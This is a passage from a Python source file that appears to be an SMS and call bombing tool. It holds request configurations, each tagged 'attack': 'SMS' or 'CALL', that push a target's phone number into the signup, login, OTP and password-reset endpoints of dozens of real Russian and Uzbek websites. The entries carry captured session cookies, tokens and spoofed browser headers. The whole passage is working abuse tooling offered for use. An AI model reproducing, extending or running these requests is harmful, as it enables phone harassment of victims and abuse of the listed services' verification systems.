            'cookies': {'acs_usuc_t': 'x_csrf=h1velkqncsd7&acs_rt=5e81cf036c56446bacbceb1a9bdc613d', 'xman_t': 'ZsUBC+itX/vJY9axOkQQJBEIbhNHKqEv8is9YlTaOdbABtxCIXmo8wIU4UdzQssy', 'xman_f': 'G5YyDcHm7mEyEARQjgXLeFDOkEppeai/QH+3Hj+KgVCGfQAtXHC1rusS/1++/n6XrOM2EqmNjzcesfQdL8Kn84MqsMNPYjYPNRLmyAP5ND07XLXV5H1JRw==', 'aeu_cid': '5fd73d1a6f72452aac4434f9f074c016-1679596793694-05194-_DBQyzxZ', 'traffic_se_co': '%7B%7D', 'af_ss_a': '1', 'af_ss_b': '1', 'xman_us_f': 'x_locale=ru_RU&x_l=0&x_c_chg=1&x_as_i=%7B%22aeuCID%22%3A%225fd73d1a6f72452aac4434f9f074c016-1679596793694-05194-_DBQyzxZ%22%2C%22affiliateKey%22%3A%22_DBQyzxZ%22%2C%22channel%22%3A%22AFFILIATE%22%2C%22cookieCacheEffectTime%22%3A1679597393697%2C%22cv%22%3A%227%22%2C%22isCookieCache%22%3A%22Y%22%2C%22ms%22%3A%221%22%2C%22pid%22%3A%221865861906%22%2C%22tagtime%22%3A1679596793694%7D&acs_rt=162577727b40471b8f2c3801847de26d', 'intl_locale': 'ru_RU', 'aep_usuc_f': 'site=rus&c_tp=RUB&region=UZ&b_locale=ru_RU', 'aer_abid': '7be7cab968ac46e3', '_ym_uid': '1679596794542582825', '_ym_d': '1679596794', '_ym_isad': '1', '_ga': 'GA1.2.1060894761.1679596794', '_gid': 'GA1.2.2074627296.1679596794', 'tmr_lvid': 'c4666a890af8223415bff8eb5ead72f7', 'tmr_lvidTS': '1679596794284', '_ym_visorc': 'b', 'cna': '+4qjHHGZyWUCAR+UZeysLA/h', 'xlly_s': '1', 'tmr_detect': '0%7C1679596796772', 'intl_common_forever': 'Ts2tXweeIL8/Vii/EV3W+i+wrRVMW/jkW3fkQWK4dmM7xZBHnndFeA==', 'JSESSIONID': '99BFEC6A3381A8CEB07CB21D597DFCBD', 'isg': 'BFRUDrB-zBv3YFhXAt_cwLAOJZLGrXiXsEFyd-4ysF9i2fgjNbylJmof2cnBJrDv', 'tfstk': 'chNcBbsBk-kfvm5TVoGfTbwSu6rcaI_nDfh7aaHpjSxuMpFIusj2UpoegUifAiJ1.', 'l': 'fBrsYR2uNPOJyTyXKO5alurza77OqBOXG1PzaNbMiIEGa61RZFgX_OCspsipodtjQT5Drp-zr3XXtdH28bz38xw7VXuPMUGliApMJeigCCA5.',},
            'headers': {'authority': 'aliexpress.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'bx-ua': '225!q0s7CizWooiz8W5qToFpdRBXi+ljrI0qk2mAJJqzwyH8FSftMpSBAN7xrJQOKaxEldxFgQeNsuv2m1k+GwCxGtaU7UQuH1+vM/xw2MUyoKItnR35EJ+NW72fqM0Pi3AOMxp+U3ioQzadD654fjdNbUDKjeI4+yYTbkZW8hulQEWdDMXhfiA4ofcjrr7FJ4hz/l/+f4GoQzaKD654fizWb3YdRw8vHch+DGHzf4jRAqSpjefqGzd3o0CGmL1ObHM+KtJsAb0qWulOKHKMOZ+XTEiujcInaoiRDl/+f4j0Qz0KDM5hfomlbULRIt5U/PTmSNHv79uuRapObAg8CtB5iI9qqBzSS9Roe+JRAwaIlD6A5B2QOOsFiIDY67JtS9n49IZRPhuOOu3rbP1jf1yeFNMIxAFShMqoydEG6Mn8kle647kxuEE4yNSNw8O44hDDSNs22eRRCjYYyHKqWN+VZtbrM2B5hYhLezXxM4WQp39YeHKPpEz53tbGBBfJhqaUeZNmYeoPva6W5sIRWdZeFzTq685oe6qUy+ORQxhBGp9rH6d47pzlb3SKjxIhoXjqDGHzfejonIrzhO0oKJa/FY6pSRdWp6QXiBdx96MkxJPL3lLZwE8XorA5c3KZ6/DZ4pbClZiCO+ZJt9DUiMh3kNZgsHnsPNH2Je88FbjzaizctMceEkHTOgUc5UEqpyJC/4g9wjQGA2lhf5zzeV5v4wmsmmSK0tCpJSf2myHQ410/Ukz7XvpMGiHcK/Uazhh+KOqm1RExqJA28r40Guz+eqGh5bTeKiSX4ZUy0cQK4XkY+AiOUqtv+cn/tsccxQ3x0Agxnas4JNSPf1UArYM4eZLF4BO9eDjJa42qvpia+IIFKXe8W78peLrH6ACXPyb0Rw6IaviEond6OdFPnZqLBxZF38sG0v3ipJNdLPB6/kkvZj3M8AZT+imJhFBLW8eobG0MPQ8e0je7mRAQ6VRKdyzNqTni4Eg9cfU8qymXpk7UdRz0L1RVtHIfw4ulrUjwo/tA9HVn4RmU6hHMlJmOQ5Z+gGVwUJmbu0XNArdRWkuqSSHtqjLZl0xdReixkTjI37p64gh+1Z5ry0PSNMr6d4UtMnMU4CUFARCN4ClvkYAjuLsZuG9EOqEwOU1fkbcH/6/mOdHz+OrFDbQuaGXp2fQvipjmreyRrCPu46ZMzIyQWA7uAq4J2p7zR+KKMLpyN+hf6NC6Py2WnPwlSkVQTUI3xpBD84S0sfu4EAmVWa221GY6SI+monC8g1vZi9ZY4nwFigOfl0N4Ep==', 'bx-umidtoken': 'T2gADuq_FDxdZ9Q5_w2bbUpIF2SBbb1o_D55AtY0AnixkM62OlIUMePOWj6SE9vH_aY=', 'bx-v': '2.2.3', 'content-type': 'text/plain;charset=UTF-8', 'origin': 'https://aliexpress.ru', 'referer': 'https://aliexpress.ru/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-aer-cna': '+4qjHHGZyWUCAR+UZeysLA/h',},
            'data': '{"phone":"+' + str(number) + '","locale":"ru_RU","currency":"RUB","returnURL":"https://aliexpress.ru/","channel":"CALL","environment":{"uaEncrpt":"225!q0s7CizWooiz8W5qToFpdRBXi+ljrI0qk2mAJJqzwyH8FSftMpSBAN7xrJQOKaxEldxFgQeNsuv2m1k+GwCxGtaU7UQuH1+vM/xw2MUyoKItnR35EJ+NW72fqM0Pi3AOMxp+U3ioQzadD654fjdNbUDKjeI4+yYTbkZW8hulQEWdDMXhfiA4ofcjrr7FJ4hz/l/+f4GoQzaKD654fizWb3YdRw8vHch+DGHzf4jRAqSpjefqGzd3o0CGmL1ObHM+KtJsAb0qWulOKHKMOZ+XTEiujcInaoiRDl/+f4j0Qz0KDM5hfomlbULRIt5U/PTmSNHv79uuRapObAg8CtB5iI9qqBzSS9Roe+JRAwaIlD6A5B2QOOsFiIDY67JtS9n49IZRPhuOOu3rbP1jf1yeFNMIxAFShMqoydEG6Mn8kle647kxuEE4yNSNw8O44hDDSNs22eRRCjYYyHKqWN+VZtbrM2B5hYhLezXxM4WQp39YeHKPpEz53tbGBBfJhqaUeZNmYeoPva6W5sIRWdZeFzTq685oe6qUy+ORQxhBGp9rH6d47pzlb3SKjxIhoXjqDGHzfejonIrzhO0oKJa/FY6pSRdWp6QXiBdx96MkxJPL3lLZwE8XorA5c3KZ6/DZ4pbClZiCO+ZJt9DUiMh3kNZgsHnsPNH2Je88FbjzaizctMceEkHTOgUc5UEqpyJC/4g9wjQGA2lhf5zzeV5v4wmsmmSK0tCpJSf2myHQ410/Ukz7XvpMGiHcK/Uazhh+KOqm1RExqJA28r40Guz+eqGh5bTeKiSX4ZUy0cQK4XkY+AiOUqtv+cn/tsccxQ3x0Agxnas4JNSPf1UArYM4eZLF4BO9eDjJa42qvpia+IIFKXe8W78peLrH6ACXPyb0Rw6IaviEond6OdFPnZqLBxZF38sG0v3ipJNdLPB6/kkvZj3M8AZT+imJhFBLW8eobG0MPQ8e0je7mRAQ6VRKdyzNqTni4Eg9cfU8qymXpk7UdRz0L1RVtHIfw4ulrUjwo/tA9HVn4RmU6hHMlJmOQ5Z+gGVwUJmbu0XNArdRWkuqSSHtqjLZl0xdReixkTjI37p64gh+1Z5ry0PSNMr6d4UtMnMU4CUFARCN4ClvkYAjuLsZuG9EOqEwOU1fkbcH/6/mOdHz+OrFDbQuaGXp2fQvipjmreyRrCPu46ZMzIyQWA7uAq4J2p7zR+KKMLpyN+hf6NC6Py2WnPwlSkVQTUI3xpBD84S0sfu4EAmVWa221GY6SI+monC8g1vZi9ZY4nwFigOfl0N4Ep==","umidToken":"T2gADuq_FDxdZ9Q5_w2bbUpIF2SBbb1o_D55AtY0AnixkM62OlIUMePOWj6SE9vH_aY=","regSrc":"AE_MAIN_LOGIN","securityTimestamp":1679596961726,"refer":"","userAgent":""}}',
            'params': {'_bx-v': '2.2.3',},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Level.Travel', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.level.travel/client/signup',
            'cookies': {'uuid': '01757ca9-4ccd-4d88-85fd-b9a7ca953a84', '_leveltravel_session': 'e948d9e1f17528ac00762b02d63d2aef', '__utma': '38027326.278055414.1687499488.1687499488.1687499488.1', '__utmc': '38027326', '__utmz': '38027326.1687499488.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', '__utmt_UA-27369706-1': '1', '__utmb': '38027326.1.10.1687499488', '_ga': 'GA1.2.278055414.1687499488', '_gid': 'GA1.2.1218351983.1687499488', '_gat_UA-27369706-7': '1', '_ym_uid': '1687499488662444903', '_ym_d': '1687499488', '_ym_isad': '1', 'mindboxDeviceUUID': 'a60d708c-ae59-4d26-ab2a-5b3ae1dfe00b', 'directCrm-session': '%7B%22deviceGuid%22%3A%22a60d708c-ae59-4d26-ab2a-5b3ae1dfe00b%22%7D',},
            'headers': {'authority': 'api.level.travel', 'accept': 'application/vnd.leveltravel.v3', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'authorization': 'Token token="0fe9fb2ff35679322db5429b18a53aee"', 'content-type': 'application/json', 'origin': 'https://level.travel', 'referer': 'https://level.travel/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': user_agent()[1], 'x-cnt': 'ru', 'x-cur': 'RUB', 'x-lang': 'ru',},
            'json': {'client': {'name': 'юзер', 'surname': 'нейм', 'phone': number, 'email': email(), 'advertising_mail_accepted': True, 'inviter_id': None,}, 'use_cookies': True, 'sign': 'd364c4a1c35179f9834b1c3354a2c913',},
        },



        {
            'info': {'country': 'ALL', 'attack': 'CALL', 'website': 'Azbuka-Severa.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://azbuka-severa.ru/local/ajax/get_phone_code.php',
            'data': {'PHONE': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'CALL', 'website': 'Shop.Hlebprom.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://shop.hlebprom.ru/',
            'headers': {'authority': 'shop.hlebprom.ru', 'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'cookie': 'PHPSESSID=j5KN4rXONUvCq4VXbTArhlOdkqdFr3xN; _ym_uid=1679392564605190701; _ym_d=1679392564; _ym_isad=1; _ym_visorc=w; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A3%2C%22EXPIRE%22%3A1679432340%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; BITRIX_SM_GUEST_ID=1671298; BITRIX_SM_LAST_VISIT=21.03.2023+12%3A56%3A50; BITRIX_SM_DEFAULT_CITY=Y; BX_USER_ID=ea933c118b0a68fc6dc847fe7b618b6f; tmr_lvid=0bbbed541ed83e658a72073f47447efd; tmr_lvidTS=1679392619689; tmr_detect=1%7C1679392620181', 'origin': 'https://shop.hlebprom.ru', 'referer': 'https://shop.hlebprom.ru/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': f'backurl=%2F&AUTH_FORM=Y&TYPE=AUTH&USER_LOGIN={number}&PERSONAL_PHONE_CODE=&PERSONAL_REG_TYPE=phone&USER_REMEMBER=Y&Login=true',
            'params': {'login': 'yes',},
        },
        {
            'info': {'country': 'ALL', 'attack': 'CALL', 'website': 'zadarma.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://my.zadarma.com/connect/',
            'params': {'?number=': '+' + str(number)}
        },
        {
            'info': {'country': 'ALL', 'attack': 'CALL', 'website': 'findclone.ru', 'anonymous': 'No'}, 
            'method': 'get',
            'url': 'https://findclone.ru/register',
            'params': {'phone': '+' + str(number)}
        },
        {
            'info': {'country': 'ALL', 'attack': 'CALL', 'website': 'dostaevsky.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://msk.dostaevsky.ru/ajax/feedback/',
            'params': {'back_call': '+' + str(number)}
        },
        {
            'info': {'country': 'ALL', 'attack': 'CALL', 'website': 'GroupPrice.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://groupprice.ru/auth_phone/make_auth_call',
            'cookies': {'_ym_uid': '1679598502328737210', '_ym_d': '1679598502', 'tmr_lvid': 'd94f4b712b60528a3e49422933a49dc3', 'tmr_lvidTS': '1679598502187', '_ym_isad': '1', 'tmr_detect': '1%7C1679598503220', 'flocktory-uuid': '36e1d551-787b-44b1-af83-a68f78ab9b86-1', 'guest_user_id': 'NTIxNjUxMjg%3D--a563046ed2d491840c95e4a26416695f09cfc899', 'utm_tags2': '%7B%22utm_source%22%3A%22admitad%22%2C%22extra%22%3A%22b1c06fe621c6cb769c64d4293ce18d6e%22%7D',},
            'headers': {'authority': 'groupprice.ru', 'accept': 'text/html, application/xhtml+xml', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryhYPfmG4rJf77jGwD', 'origin': 'https://groupprice.ru', 'referer': 'https://groupprice.ru/?utm_source=admitad&admitad_uid=b1c06fe621c6cb769c64d4293ce18d6e&utm_medium=cpa&utm_campaign=253174', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-csrf-token': 'null', 'x-requested-with': 'XMLHttpRequest',},
            'data': f'------WebKitFormBoundaryhYPfmG4rJf77jGwD\r\nContent-Disposition: form-data; name="phone"\r\n\r\n+{number}\r\n------WebKitFormBoundaryhYPfmG4rJf77jGwD\r\nContent-Disposition: form-data; name="time_zone"\r\n\r\n300\r\n------WebKitFormBoundaryhYPfmG4rJf77jGwD\r\nContent-Disposition: form-data; name="token"\r\n\r\n\r\n------WebKitFormBoundaryhYPfmG4rJf77jGwD--\r\n',
        },
        {
            'info': {'country': 'ALL', 'attack': 'CALL', 'website': 'Zonatelecom.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.zonatelecom.ru/api/identify',
            'cookies': {'_ym_uid': '1687175321580816299', '_ym_d': '1687175321', '_ymab_param': 'qUvC5QKj1L4DqNBDG40WW-PxAuTWvb-uZMCNPIKNqz82W_ZOa3AZUF852UZWIzi-9PVwTuxLTiF_X5PDAl5hlA7PWDM', 'popmechanic_sbjs_migrations': 'popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1', '0dfc79cc9a8ac29718cceab87b1abd15': '4lft86s3bhqr1dimvf8mb9iqj8', '__ZTKSID': '0dfc79cc9a8ac29718cceab87b1abd15', '_ym_isad': '1', '_ym_visorc': 'w', '_ga': 'GA1.2.1164620365.1687175321', '_gid': 'GA1.2.219948254.1687503393', '_gat_UA-80332916-1': '1', 'carrotquest_session': '6qeo67rxp30yd2xebq3fdxv32nj90eiw', 'carrotquest_session_started': '1', 'carrotquest_device_guid': 'b203886d-ad0d-44a1-8c87-509586056c0e', 'carrotquest_uid': '1471323386952027304', 'carrotquest_auth_token': 'user.1471323386952027304.55764-fe060243156e7f5772113659d3.1dbd8a6878caf0125cbda3e59a7966ec82184a685f76dd27', 'carrotquest_realtime_services_transport': 'wss', '_csrf': 'aHMUVMbvOT6DIFEuHttAcRAl', '_ga_CPBP6P43D2': 'GS1.1.1687503392.2.1.1687503411.0.0.0',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'CSRF-Token': 'OZhH8VPY-4pmWFHEOQYOKdzzhCrOf-eG5F5c', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://www.zonatelecom.ru', 'Referer': 'https://www.zonatelecom.ru/auth/call', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'act': 'auth', 'g-recaptcha-response': '03AL8dmw-Rhxt_w-GGUa5kbdYVmy18maWAQZkGhs0-qUScMtdHq1ogbGHb2T8dHdossAiP3bFy_tPA4fMHx-W39S_mWZz8McSWpcfZeE0F_nJDPsQZdKkC3afvUb9VX7L7zQ9srovDfzqbX4HpD-k5xxmFnxFLzVWDw8uML6ba6k5wOPAedGKILHZhdMKo2WEpFS19gkBhpejKspkDkP6Hj_h10o8YKcOgGctJFpZ7kaIzhCuNEK-R5RJe495c8YZRGRnaMeDKBWy0SIpPv_zu9tHRAcrxZNanEzdhK5cZS7T6MipSARRgcfZXNBER-VyvBG6HR-dhFJtE5mth8PTgk3FtrJc2rJmh2K6zSbvP9tNWxj6hyeHUjsOeD_MjgYbAsIeTZs8nesxlXSor_4zX6nPYKobTknUZOQYu3-L-HphCaI1fVSCNapJ0kLbinstuyNv_NQ6x9LmFSTs3EnbD5NxA97uhiLqaKZmllsS41fPdyvYBK__Go5BUF-bdaqsse01NFOv2f8ajFc3Adb1jWkO6ObL-nMLfjg', 'method': 'call', 'phone': number,},
        },










        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'DavrMobile.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': f'https://davrmobile.uz/api/v1/auth/registration/{number}/verification/request?lang=ru&platform=WEB',
            'data': {'lang': 'ru', 'platform': 'WEB'},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'iTV.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.itv.uz/v2/auth/sign-up',
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://itv.uz', 'Referer': 'https://itv.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'iAuth': 'false', 'iLanguage': 'ru', 'iPlatform': 'WebSite', 'iTime': '1679405037067', 'iToken': '546b4decdc7616b5e95b5ee7e2961fa4', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'email': number, 'name': 'User', 'password': 'bRW-qKq-6wT-3Ba',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'AIM.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://aim.uz/smsAPI/sms_sender.php',
            'data': {'recovery': 1, 'userTel': str(number)[3:]},
            # Регистрация на номер (если нет акка)
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'AIM.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://aim.uz/smsAPI/sms_sender.php',
            'data': {'recovery': 0, 'userTel': str(number)[3:]},
            # Восстанововление пароля (если акк есть)
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Bellissimo.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://io.bellissimo.uz/api/verify',
            'headers': user_agent()[0],
            'json': {'phone': f'+{number}'},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Bringo.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.bringo.uz/api/v1/register/phone',
            'headers': user_agent()[0],
            'json': {'phone': f'+{number}'},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Express24.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://express24.uz/rest/v2/auth/code',
            'headers': user_agent()[0],
            'json': {'number': f'+{number}'},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'XMed.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://prod.xmed.uz/Tele-medicine-0.0.1-SNAPSHOT/v2/auth/registration',
            'headers': {'authority': 'prod.xmed.uz', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'language': 'ru', 'origin': 'https://xmed.uz', 'referer': 'https://xmed.uz/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': user_agent()[1],},
            'json': {'mobileNumber': f'+{number}',},
            # Регистрация на номер (если нет акка)
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'XMed.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://prod.xmed.uz/Tele-medicine-0.0.1-SNAPSHOT/v2/auth/login',
            'headers': {'authority': 'prod.xmed.uz', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'language': 'ru', 'origin': 'https://xmed.uz', 'referer': 'https://xmed.uz/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': user_agent()[1],},
            'json': {'mobileNumber': f'+{number}',},
            # Вход в акк (если акк есть)
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'DANA.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.dana.uz/api/v1/login/verify',
            'headers': user_agent()[0],
            'data': {'phone': f'+{number}'},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Texnomart.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://backend.texnomart.uz/api/v1/user/register',
            'headers': {'authority': 'backend.texnomart.uz', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru', 'content-type': 'application/json', 'origin': 'https://texnomart.uz', 'referer': 'https://texnomart.uz/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': user_agent()[1], },
            'json': {'phone': f'+{number}', 'first_name': 'User', 'last_name': 'Name', },
            # Регистрация на номер (если нет акка)
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Texnomart.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://backend.texnomart.uz/api/v2/user/login-phone',
            'headers': {'authority': 'backend.texnomart.uz', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru', 'content-type': 'application/json', 'origin': 'https://texnomart.uz', 'referer': 'https://texnomart.uz/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': user_agent()[1], },
            'json': {'phone': f'+{number}', },
            # Вход в акк (если акк есть)
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Allplay.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.allplay.uz/api/v1/register',
            'headers': {'authority': 'api.allplay.uz', 'accept': 'application/json', 'accept-language': 'ru', 'content-type': 'application/json', 'origin': 'https://allplay.uz', 'referer': 'https://allplay.uz/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': user_agent()[1], 'x-allplay-app': 'web', 'x-allplay-brand': 'Windows 10', 'x-allplay-device-id': 'ivsssssmb990053w359x6fb3', 'x-allplay-model': 'yandexbrowser 23.1.5', 'x-allplay-os-version': 'Windows 10', 'x-allplay-version': '1.15.2',},
            'json': {'name': 'User', 'email': number, 'password': 'F72-m5d-KEi-gJ6',},
            # Регистрация на номер (если нет акка)
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Allplay.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.allplay.uz/api/v1/password/reset',
            'headers': {'authority': 'api.allplay.uz', 'accept': 'application/json', 'accept-language': 'ru', 'content-type': 'application/json', 'origin': 'https://allplay.uz', 'referer': 'https://allplay.uz/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': user_agent()[1], 'x-allplay-app': 'web', 'x-allplay-brand': 'Windows 10', 'x-allplay-device-id': 'ivsssssmb990053w359x6fb3', 'x-allplay-model': 'yandexbrowser 23.1.5', 'x-allplay-os-version': 'Windows 10', 'x-allplay-version': '1.15.2',},
            'json': {'email': number,},
            # Восстанововление пароля (если акк есть)
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Olcha.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://mobile.olcha.uz/api/v2/sendsms2',
            'headers': {'Connection': 'keep-alive', 'Origin': 'https://olcha.uz', 'Referer': 'https://olcha.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'accept': 'application/json', 'accept-language': 'ru', 'content-type': 'application/json', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'phone': number,},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Hopshop.uz', 'anonymous': 'Yes'},
            'method': 'get',
            'url': f'https://hopshop.uz/index.php?dispatch=csc_sms.generate_code&phone={str(number)[3:]}&prefix=%2B998&is_ajax=1',
            'headers': user_agent()[0],
            'data': {'dispatch': 'csc_sms.generate_code', 'phone': str(number)[3:], 'prefix': '+998', 'is_ajax': 1},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'ByShop.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://admin.byshop.uz/api/v1/login',
            'headers': user_agent()[0],
            'json': {'phone': f'+{number}'},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Alifshop.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api2.alifshop.uz/web/client/auth/request-otp',
            'headers': user_agent()[0],
            'json': {'phone': f'+{number}'},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'BrandStore.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.brandstore.uz/api/auth/code/create/',
            'headers': user_agent()[0],
            'json': {'phone': f'+{number}'},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'GoodZone.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.goodzone.uz/v1/customer/register',
            'headers': user_agent()[0],
            'data': {'lastname': 'Name', 'name': 'User', 'password': 'EVj-rt7-XMR-fKv', 'phone': f'+{number}'},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'KidsPlate.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://kidsplate.uz/auth/',
